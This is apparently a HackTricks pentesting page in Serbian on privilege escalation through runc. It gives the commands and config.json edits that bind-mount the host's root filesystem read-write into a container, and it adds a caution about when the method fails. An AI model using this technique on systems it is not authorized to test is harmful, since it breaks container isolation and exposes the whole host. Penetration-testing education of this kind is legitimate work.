# Eskalacija privilegija RunC

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako želite da saznate više o **runc**, pogledajte sledeću stranicu:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ako utvrdite da je `runc` instaliran na hostu, možda ćete moći da **pokrenete kontejner koji montira root / fasciklu hosta**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Ovo neće uvek funkcionisati, jer je podrazumevano ponašanje runc-a pokretanje kao root, pa njegovo pokretanje kao korisnik bez privilegija jednostavno ne može da funkcioniše (osim ako imate rootless konfiguraciju). Postavljanje rootless konfiguracije kao podrazumevane uglavnom nije dobra ideja, jer unutar rootless kontejnera postoji prilično mnogo ograničenja koja ne važe izvan rootless kontejnera.

{{#include ../../banners/hacktricks-training.md}}
